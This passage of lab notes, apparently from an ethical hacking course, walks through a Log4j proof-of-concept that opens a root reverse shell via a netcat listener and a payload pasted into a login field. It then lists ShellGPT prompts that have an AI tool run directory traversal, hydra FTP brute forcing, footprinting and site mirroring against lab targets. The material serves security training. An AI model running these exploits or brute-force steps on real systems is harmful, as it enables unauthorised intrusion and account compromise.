id="2643addf-00cb-8042-ba00-e7e249cd5ff3" class="numbered-list" start="2"><li><em><strong>tar -xf jdk-8u202-linux-x64.tar.gz </strong></em></li></ol></li></ol><ol type="a" id="2643addf-00cb-8034-986b-eab1b24ebe12" class="numbered-list" start="5"><li>Move file to /user/bin<ol type="i" id="2643addf-00cb-807b-aa56-d598584d57bd" class="numbered-list" start="1"><li><em><strong> mv jdk1.8.0_202 /usr/bin/ </strong></em></li></ol></li></ol><ol type="a" id="2643addf-00cb-80f4-b04f-e7c952dbd56a" class="numbered-list" start="6"><li>Update the installed JDK path in the <a href="http://poc.py/">poc.py</a> file<ol type="i" id="2643addf-00cb-807a-82ea-fa3bae1c2aae" class="numbered-list" start="1"><li>Switch to previous terminal window </li></ol><ol type="i" id="2643addf-00cb-8021-ad97-ff431ddab48b" class="numbered-list" start="2"><li><em><strong>pluma poc.py</strong></em></li></ol><ol type="i" id="2643addf-00cb-801f-8933-c974a4c53640" class="numbered-list" start="3"><li>Replace line 62, 87, and 99 with <strong>/usr/bin/jdk1.8.0_202/bin/javac</strong><figure id="2643addf-00cb-8098-8010-eb3c7674e692" class="image"><a href="image%2066.png"><img style="width:598.0506591796875px" src="image%2066.png"/></a></figure></li></ol><ol type="i" id="2643addf-00cb-80c1-a910-f261ca3cf856" class="numbered-list" start="4"><li>Replace line 87 and99 with /usr/bin/jdk1.8.0_202/bin/java.</li></ol><ol type="i" id="2643addf-00cb-80cf-943b-f5843a7c50fc" class="numbered-list" start="5"><li>New terminal window → <em><strong>nc -lvp 9001 </strong></em>to create netcat listener</li></ol><ol type="i" id="2643addf-00cb-8092-af25-c24dc01d96d1" class="numbered-list" start="6"><li>Switch to terminal window at path /log4j-shell-poc<ol type="1" id="2643addf-00cb-80bd-9351-e9f9f2c04650" class="numbered-list" start="1"><li><em><strong>python3 </strong></em><em><strong><a href="http://poc.py/">poc.py</a></strong></em><em><strong> --userip 10.10.1.13 --webport 8000 --lport 9001 </strong></em></li></ol><ol type="1" id="2643addf-00cb-800c-8ed2-f086bd82709b" class="numbered-list" start="2"><li>Copy the payload generate in the <strong>send me </strong>section</li></ol><ol type="1" id="2643addf-00cb-8013-8b1e-dc874e33cf55" class="numbered-list" start="3"><li>Paste payload into Username field in Firefox browser (can enter any password in password field) </li></ol></li></ol><ol type="i" id="2643addf-00cb-8093-bc24-d2c2714c7f19" class="numbered-list" start="7"><li>Switch to netcat listener - can see reverse shell is opened<ol type="1" id="2643addf-00cb-805a-a986-df4af3c353ed" class="numbered-list" start="1"><li>Type pwd to view working directory</li></ol><ol type="1" id="2643addf-00cb-8085-ab38-c65e1699684d" class="numbered-list" start="2"><li>Type whoami - should have root access</li></ol></li></ol></li></ol></li></ol></div></details><p id="2643addf-00cb-80b6-911d-ef470668797a" class="">
+</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 2: Web Server Hacking using AI</summary><div class="indented"><p id="2643addf-00cb-80df-859c-ff9c577407d3" class="">
+</p><h3 id="2643addf-00cb-807d-8f2f-f180c75e03c6" class="">Task 1: Perform Web Server Footprinting and Attacks using ShellGPT</h3><p id="2643addf-00cb-8083-8a44-fd355b42260f" class="">
+</p><p id="2643addf-00cb-808b-b22f-d4fcdee6f019" class="">Perform directory traversal: </p><p id="2643addf-00cb-80d4-aebc-cdae41e3e383" class=""><em><strong>sgpt --shell “Perform a directory traversal on target url </strong></em><em><strong><a href="https://certifiedhacker.com/">https://certifiedhacker.com</a></strong></em><em><strong> using gobuster” </strong></em></p><p id="2643addf-00cb-809b-be38-d933f9c4b3ab" class="">
+</p><p id="2643addf-00cb-808e-8c7e-ed528ec2b147" class="">FTP bruteforce attack:</p><p id="2643addf-00cb-806d-a177-e67b47b316b8" class=""><em><strong>sgpt --shell &quot;Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists</strong></em></p><p id="2643addf-00cb-80f9-94f1-c787bb556dc2" class="">
+</p><p id="2643addf-00cb-804d-9599-f5f3093ce073" class="">Webserver footprinting on target IP address: </p><p id="2643addf-00cb-8069-902f-fdd5bd82c22b" class=""><em><strong>sgpt --shell &quot;Perform webserver footprinting on target IP 10.10.1.22&quot; </strong></em></p><p id="2643addf-00cb-8018-8b1c-da1011dfddd6" class="">
+</p><p id="2643addf-00cb-8087-8f4b-ce1271d6edd6" class="">Perform web server footprinting using netcat: </p><p id="2643addf-00cb-801d-bb43-e797910c5a9c" class=""><em><strong>sgpt --shell &quot;Perform web server footprinting on target IP 10.10.1.22 using Netcat by sending an HTTP request and analyzing the response.” </strong></em></p><p id="2643addf-00cb-80a6-80c8-d82f7d19fba3" class="">
+</p><p id="2643addf-00cb-80e7-bbfe-cd495e6a720a" class="">Website mirroring using ShellGPT: </p><p id="2643addf-00cb-803d-8cd4-eeba5dfeb865" class=""><em><strong>sgpt --shell “Mirror the target website </strong></em><em><strong><a href="http://certifiedhacker.com/">certifiedhacker.com</a></strong></em><em><strong>” </strong></em></p><p id="2643addf-00cb-80ca-aa9f-ffa1eeb2c550" class="">
+</p></div></details><p id="27e3addf-00cb-808e-b12e-ee8823e1bc9b" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
